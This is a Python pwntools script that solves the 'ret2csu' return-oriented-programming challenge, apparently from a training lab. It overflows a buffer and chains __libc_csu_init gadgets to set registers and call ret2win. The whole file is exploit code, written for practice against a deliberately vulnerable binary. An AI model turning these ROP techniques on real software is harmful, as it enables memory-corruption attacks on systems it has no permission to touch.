#! /usr/bin/env python
from pwn import *

program = "./ret2csu"

proc = process(program)

elf_prog = ELF(program)

libc = ELF("./libret2csu.so")
#pid = gdb.attach(proc, '''
#    set pagination off
#    set disassembly-flavor intel    
#    b * 0x04006a4
#    b * 0x40062a
#    continue
#    '''
#    )

plt_ret2win = elf_prog.plt['ret2win']
got_ret2win = elf_prog.got['ret2win']
usefulFunction = elf_prog.symbols['usefulFunction']
_init = elf_prog.symbols['_init']
init = 0x400398 # _init function address in memory
main = elf_prog.symbols['main']
libc_csu_init_call_part = elf_prog.symbols['__libc_csu_init'] + 64
libc_csu_init_pop_part = elf_prog.symbols['__libc_csu_init'] + 90

align_gadget = 0x04004e6 # ret;
gadget1 = 0x04006a3 # pop rdi; ret;

payload = b'A'*40 
# pop rbx, pop rbp, pop r12 --> call address, pop r13 --> edi, pop r14 --> rsi, pop r15 -->rdx
payload += p64(libc_csu_init_pop_part) + p64(0x0) + p64(0x1) + p64(init) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

payload += p64(align_gadget) + p64(libc_csu_init_call_part) # call _init
#add rsp 0x8
# pop rbx, pop rbp, pop r12 --> call address, pop r13 --> edi, pop r14 --> rsi, pop r15 -->rdx
payload += p64(0x0) + p64(0x0) + p64(0x1) + p64(got_ret2win) + p64(0x0) + p64(0x0) + p64(0x0)

payload += p64(gadget1) + p64(0xdeadbeefdeadbeef) # set rdi to 0xdeadbeefdeadbeef

payload += p64(align_gadget) + p64(libc_csu_init_call_part + 9) # call ret2win

proc.recvuntil('> ')
proc.sendline(payload)

proc.interactive()



